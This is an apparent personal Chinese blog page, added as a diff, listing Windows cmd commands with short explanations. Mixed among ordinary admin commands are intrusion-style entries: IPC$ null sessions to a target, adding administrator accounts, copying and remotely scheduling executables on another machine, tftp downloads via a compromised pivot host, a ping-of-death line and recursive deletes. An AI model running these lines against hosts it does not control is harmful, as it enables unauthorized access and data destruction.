@@ -1,0 +1,736 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.2.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon.ico">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"emptybottle.xyz","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left"},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="net use ipipc$ “ “ &#x2F;user:” “ 建立IPC空链接">
+<meta property="og:type" content="article">
+<meta property="og:title" content="cmd指令">
+<meta property="og:url" content="http://emptybottle.xyz/2022/05/19/cmd%E6%8C%87%E4%BB%A4/index.html">
+<meta property="og:site_name" content="Emptybottle的博客">
+<meta property="og:description" content="net use ipipc$ “ “ &#x2F;user:” “ 建立IPC空链接">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2022-05-19T00:43:00.000Z">
+<meta property="article:modified_time" content="2022-05-19T01:23:09.634Z">
+<meta property="article:author" content="Emptybottle">
+<meta property="article:tag" content="cmd指令">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://emptybottle.xyz/2022/05/19/cmd%E6%8C%87%E4%BB%A4/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>cmd指令 | Emptybottle的博客</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="Emptybottle的博客" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Emptybottle的博客</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-友链">
+
+    <a href="/friendlink/" rel="section"><i class="fa fa-link fa-fw"></i>友链</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://emptybottle.xyz/2022/05/19/cmd%E6%8C%87%E4%BB%A4/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="Emptybottle">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Emptybottle的博客">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          cmd指令
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2022-05-19 08:43:00 / 修改时间：09:23:09" itemprop="dateCreated datePublished" datetime="2022-05-19T08:43:00+08:00">2022-05-19</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%8C%87%E4%BB%A4/" itemprop="url" rel="index"><span itemprop="name">指令</span></a>
+                </span>
+            </span>
+
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2022/05/19/cmd%E6%8C%87%E4%BB%A4/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2022/05/19/cmd%E6%8C%87%E4%BB%A4/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>4.4k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+	
+	
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <ol>
+<li>net use ipipc$ “ “ /user:” “ 建立IPC空链接<a id="more"></a></li>
+<li>net use ipipc$ “密码” /user:”用户名” 建立IPC非空链接</li>
+<li>net use h: ipc$ “密码” /user:”用户名” 直接登陆后映射对方C：到本地为H:</li>
+<li>net use h: ipc$ 登陆后映射对方C：到本地为H:</li>
+<li>net use ipipc$ /del 删除IPC链接</li>
+<li>net use h: /del 删除映射对方到本地的为H:的映射</li>
+<li>net user 用户名　密码　/add 建立用户</li>
+<li>net user guest /active:yes 激活guest用户</li>
+<li>net user 查看有哪些用户</li>
+<li>net user 帐户名 查看帐户的属性</li>
+<li>net localgroup administrators 用户名 /add 把“用户”添加到管理员中使             其具有管理员权限</li>
+<li>net start 查看开启了哪些服务</li>
+<li>net start 服务名　开启服务；(如:net start telnet， net start                  schedule)</li>
+<li>net stop 服务名 停止某服务</li>
+<li>net time 目标ip 查看对方时间</li>
+<li>net time 目标ip /set 设置本地计算机时间与“目标IP”主机的时间同步,加上              参数/yes可取消确认信息</li>
+<li>net view 查看本地局域网内开启了哪些共享</li>
+<li>net view ip 查看对方局域网内开启了哪些共享</li>
+<li>net config 显示系统网络设置</li>
+<li>net logoff 断开连接的共享</li>
+<li>net pause 服务名 暂停某服务</li>
+<li>net send ip “文本信息” 向对方发信息</li>
+<li>net ver 局域网内正在使用的网络连接类型和信息</li>
+<li>net share 查看本地开启的共享</li>
+<li>net share ipc$ 开启ipc$共享</li>
+<li>net share ipc$ /del 删除ipc$共享</li>
+<li>net share c$ /del 删除C：共享</li>
+<li>net user guest 12345 用guest用户登陆后用将密码改为12345</li>
+<li>net password 密码 更改系统登陆密码</li>
+<li>netstat -a 查看开启了哪些端口,常用netstat -an</li>
+<li>netstat -n 查看端口的网络连接情况，常用netstat -an</li>
+<li>netstat -v 查看正在进行的工作</li>
+<li>netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况</li>
+<li>netstat -s 查看正在使用的所有协议使用情况</li>
+<li>netstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的               用户名</li>
+<li>tracert -参数 ip(或计算机名) 跟踪路由（数据包），参数：“-w数字”用于设              置超时间隔。</li>
+<li>ping ip(或域名) 向对方主机发送默认大小为32字节的数据，参数：“-l[空格]                  数据包大小”；“-n发送数据次数”；“-t”指一直ping。</li>
+<li>ping -t -l 65550 ip 死亡之ping(发送大于64K的文件并一直ping就成了死               亡之ping)</li>
+<li>ipconfig (winipcfg) 用于windows NT及XP(windows 95 98)查看本地ip              地址，ipconfig可用参数“/all”显示全部配置信息</li>
+<li>tlist -t 以树行列表显示进程(为系统的附加工具，默认是没有安装的，在安装目               录的Support/tools文件夹内)</li>
+<li>kill -F 进程名 加-F参数后强制结束某进程(为系统的附加工具，默认是没有安               装的， 在安装目录的Support/tools文件夹内)</li>
+<li>del -F 文件名 加-F参数后就可删除只读文件,/AR、/AH、/AS、/AA分别表示删                除只读、隐藏、系统、存档文件，/A-R、/A-H、/A-S、/A-A表示删               除除只读、 隐藏、系统、存档以外的文件。例如“DEL/AR *.*”表示                 删除当前目录下所有只读件，“DEL/A-S *.*”表示删除当前目录下除               系统文件以外的所有文件</li>
+<li>del /S /Q 目录 或用：rmdir /s /Q 目录 /S删除目录及目录下的所有子目录                 和文件。同时使用参数/Q 可取消删除操作时的系统确认就直接删除。              （二个命令作用相同）</li>
+<li>move 盘符路径要移动的文件名　存放移动文件的路径移动后文件名 移动文件,用                  参数/y将取消确认移动目录存在相同文件的提示就直接覆盖</li>
+<li>fc one.txt two.txt &gt; 3st.txt 对比二个文件并把不同之处输出到3st.txt                 文件中，”&gt; “和”&gt; &gt;” 是重定向命令</li>
+<li>at id号 开启已注册的某个计划任务</li>
+<li>at /delete 停止所有计划任务，用参数/yes则不需要确认就直接停止</li>
+<li>at id号 /delete 停止某个已注册的计划任务</li>
+<li>at 查看所有的计划任务</li>
+<li>at ip time 程序名(或一个命令) /r 在某时间运行对方某程序并重新启动计算                  机</li>
+<li>finger username @host 查看最近有哪些用户登陆</li>
+<li>telnet ip 端口 远和登陆服务器,默认端口为23</li>
+<li>open ip 连接到IP（属telnet登陆后的命令）</li>
+<li>telnet 在本机上直接键入telnet 将进入本机的telnet</li>
+<li>copy 路径文件名1　路径文件名2 /y 复制文件1到指定的目录为文件2，用参数/y                 就同时取消确认你要改写一份现存目录文件</li>
+<li>copy c:srv.exe ipadmin$ 复制本地c:srv.exe到对方的admin下</li>
+<li>copy 1st.jpg/b+2st.txt/a 3st.jpg 将2st.txt的内容藏身到1st.jpg中                  生成3st.jpg新的文件，注：2st.txt文件头要空三排，参数：/b指                 二进制文件，/a指ASCLL格式文件</li>
+<li>copy ipadmin$svv.exe c: 或:copyipadmin$<em>.</em> 复制对方admini$共享下              的srv.exe文件（所有文件）至本地C：</li>
+<li>xcopy 要复制的文件或目录树　目标地址目录名 复制文件和目录树，用参数/Y将              不提示覆盖相同文件用参数/e才可连目录下的子目录一起复制到目标               地址下。</li>
+<li>tftp -i 自己IP(用肉机作跳板时这用肉机IP) get server.exe                           c:server.exe登陆后，将“IP”的server.exe下载                          到目标主机c:server.exe 参数：-i    指以二进制模式传送，如传              送exe文件时用，如不加-i 则以ASCII模式（传送文本文件模式）进               行传送</li>
+<li>tftp -i 对方IP　put c:server.exe 登陆后，上传本地c:server.exe至主              机</li>
+<li>ftp ip 端口 用于上传文件至服务器或进行文件操作，默认端口为21。bin指用二                进制方式传送（可执行文件进）；默认为ASCII格式传送(文本文件              时)</li>
+<li>route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码             Netmask，网关地址Gateway addres，接口地址Interface</li>
+<li>arp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理                性的MAC地址。arp -a将显示出全部信息</li>
+<li>start 程序名或命令 /max 或/min 新开一个新窗口并最大化（最小化）运行某                 程序或命令</li>
+<li>mem 查看cpu使用情况</li>
+<li>attrib 文件名(目录名) 查看某文件（目录）的属性</li>
+<li>attrib 文件名 -A -R -S -H 或 +A +R +S +H 去掉(添加)某文件的 存档，                只读，系统，隐藏 属性；用+则是添加为某属性</li>
+<li>dir 查看文件，参数：/Q显示文件及目录属系统哪个用户，/T:C显示文件创建时             间， /T:A显示文件上次被访问时间，/T:W上次被修改时间</li>
+<li>date /t 、 time /t 使用此参数即“DATE/T”、“TIME/T”将只显示当前日期和               时间，而不必输入新日期和时间</li>
+<li>set 指定环境变量名称=要指派给变量的字符 设置环境变量</li>
+<li>set 显示当前所有的环境变量</li>
+<li>set p(或其它字符) 显示出当前以字符p(或其它字符)开头的所有环境变量</li>
+<li>pause 暂停批处理程序，并显示出：请按任意键继续….</li>
+<li>if 在批处理程序中执行条件处理（更多说明见if命令及变量）</li>
+<li>goto 标签 将cmd.exe导向到批处理程序中带标签的行（标签必须单独一行，且以               冒号打头，例如：“：start”标签）</li>
+<li>call 路径批处理文件名 从批处理程序中调用另一个批处理程序 （更多说明见                 call/?）</li>
+<li>for 对一组文件中的每一个文件执行某个特定命令（更多说明见for命令及变量）</li>
+<li>echo on或off 打开或关闭echo，仅用echo不加参数则显示当前echo设置</li>
+<li>echo 信息 在屏幕上显示出信息</li>
+<li>echo 信息 &gt;&gt; pass.txt 将”信息”保存到pass.txt文件中</li>
+<li>findstr “Hello” aa.txt 在aa.txt文件中寻找字符串hello</li>
+<li>find 文件名 查找某文件</li>
+<li>title 标题名字 更改CMD窗口标题名字</li>
+<li>color 颜色值 设置cmd控制台前景和背景颜色；0=黑、1=蓝、2=绿、3=浅绿、4=              红、5=紫、6=黄、7=白、8=灰、9=淡蓝、A=淡绿、B=淡浅绿、C=淡                 红、D=淡紫、E=淡黄、F=亮白</li>
+<li>prompt 名称 更改cmd.exe的显示的命令提示符(把C:、D:统一改为：EntSky )</li>
+<li>ver 在DOS窗口下显示版本信息</li>
+<li>winver 弹出一个窗口显示版本信息（内存大小、系统版本、补丁版本、计算机                 名）</li>
+<li>format 盘符 /FS:类型 格式化磁盘,类型:FAT、FAT32、NTFS ,例：Format                 D:/FS:NTFS</li>
+<li>md　目录名 创建目录</li>
+<li>replace 源文件　要替换文件的目录 替换文件</li>
+<li>ren 原文件名　新文件名 重命名文件名</li>
+<li>tree 以树形结构显示出目录，用参数-f 将列出第个文件夹中文件名称</li>
+<li>type 文件名 显示文本文件的内容</li>
+<li>more 文件名 逐屏显示输出文件</li>
+<li>doskey 要锁定的命令=字符</li>
+<li>doskey 要解锁命令= 为DOS提供的锁定命令(编辑命令行，重新调用win2k命令，             并创建宏)。如：锁定dir命令：doskey dir=entsky (不能用                 doskey dir=dir)；解锁：doskey dir=taskmgr 调出任务管理器</li>
+<li>chkdsk /F D: 检查磁盘D并显示状态报告；加参数/f并修复磁盘上的错误</li>
+<li>tlntadmn telnt服务admn,键入tlntadmn选择3，再选择8,就可以更改telnet                服务默认端口23为其它任何端口</li>
+<li>exit 退出cmd.exe程序或目前，用参数/B则是退出当前批处理脚本而不是                 cmd.exe</li>
+<li>path 路径可执行文件的文件名 为可执行文件设置一个路径。</li>
+<li>cmd 启动一个win2K命令解释窗口。参数：/eff、/en 关闭、开启命令扩展；更             我详细说明见cmd /?</li>
+<li>regedit /s 注册表文件名 导入注册表；参数/S指安静模式导入，无任何提示；</li>
+<li>regedit /e 注册表文件名 导出注册表</li>
+<li>cacls 文件名　参数 显示或修改文件访问控制列表（ACL）——针对NTFS格式                 时。参数：/D 用户名:设定拒绝某用户访问；/P 用户名:perm 替换              指定用户的访问权限；/G 用户名:perm 赋予指定用户访问权                     限；Perm 可以是: N无，R读取，W写入，C更改(写入)，F 完全控              制；例：cacls D: est.txt/D pub 设定d: est.txt拒绝pub用户             访问。</li>
+<li>cacls 文件名 查看文件的访问用户权限列表</li>
+<li>REM 文本内容 在批处理文件中添加注解</li>
+<li>netsh 查看或更改本地网络配置情况</li>
+</ol>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>Emptybottle Authorization</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.png" alt="Emptybottle 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.png" alt="Emptybottle 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+  <div class="followme">
+    <p>欢迎关注我的其它发布渠道</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/wechat_channel.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/cmd%E6%8C%87%E4%BB%A4/" rel="tag"><i class="fa fa-tag"></i> cmd指令</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/05/19/win-R%E6%8C%87%E4%BB%A4/" rel="prev" title="win指令">
+      <i class="fa fa-chevron-left"></i> win指令
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2022/05/19/IIS%E6%9C%8D%E5%8A%A1%E5%91%BD%E4%BB%A4/" rel="next" title="IIS服务命令">
+      IIS服务命令 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+    <div class="comments" id="valine-comments"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">Emptybottle</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">15</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">6</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/kpz-wm" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;kpz-wm" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=fivestarlongan0w@qq.com" title="E-Mail → http:&#x2F;&#x2F;mail.qq.com&#x2F;cgi-bin&#x2F;qm_share?t&#x3D;qm_mailme&amp;email&#x3D;fivestarlongan0w@qq.com" rel="noopener" target="_blank"><i class="fab fa-qq fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/6889037771/profile?rightmod=1&wvr=6&mod=personinfo" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;6889037771&#x2F;profile?rightmod&#x3D;1&amp;wvr&#x3D;6&amp;mod&#x3D;personinfo" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+  <div class="links-of-blogroll motion-element">
+    <div class="links-of-blogroll-title"><i class="fa fa-link fa-fw"></i>
+      友情链接
+    </div>
+    <ul class="links-of-blogroll-list">
+        <li class="links-of-blogroll-item">
+          <a href="http://emptybottle.xyz/" title="http:&#x2F;&#x2F;emptybottle.xyz&#x2F;">首页</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://blog.csdn.net/qq_45322343?spm=1000.2115.3001.5343" title="https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_45322343?spm&#x3D;1000.2115.3001.5343" rel="noopener" target="_blank">CSDN</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="https://m0re.top/" title="https:&#x2F;&#x2F;m0re.top" rel="noopener" target="_blank">m0re</a>
+        </li>
+        <li class="links-of-blogroll-item">
+          <a href="http://emptybottle.xyz/" title="http:&#x2F;&#x2F;emptybottle.xyz&#x2F;">添加友链</a>
+        </li>
+    </ul>
+  </div>
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Emptybottle</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-area"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">20k</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+      <span class="post-meta-item-text">站点阅读时长 &asymp;</span>
+    <span title="站点阅读时长">18 分钟</span>
+</div>
+
+<!--
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+-->
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("7/1/2020 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "emptybottle access "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+    
+
+<script>
+NexT.utils.loadComments(document.querySelector('#valine-comments'), () => {
+  NexT.utils.getScript('//unpkg.com/valine/dist/Valine.min.js', () => {
+    var GUEST = ['nick', 'mail', 'link'];
+    var guest = 'nick,mail,link';
+    guest = guest.split(',').filter(item => {
+      return GUEST.includes(item);
+    });
+    new Valine({
+      el         : '#valine-comments',
+      verify     : false,
+      notify     : false,
+      appId      : '2NvHzDjWRCyuBkIKIi8vj1zt-gzGzoHsz',
+      appKey     : 'L2SL0J7IqBDjwDXqg3dvE1Vg',
+      placeholder: "纯粹记录个人笔记，欢迎留言指正与交流# Comment box placeholder",
+      avatar     : 'mm',
+      meta       : guest,
+      pageSize   : '10' || 10,
+      visitor    : false,
+      lang       : '' || 'zh-cn',
+      path       : location.pathname,
+      recordIP   : false,
+      serverURLs : ''
+    });
+  }, window.Valine);
+});
+</script>
+
+</body>
+</html>
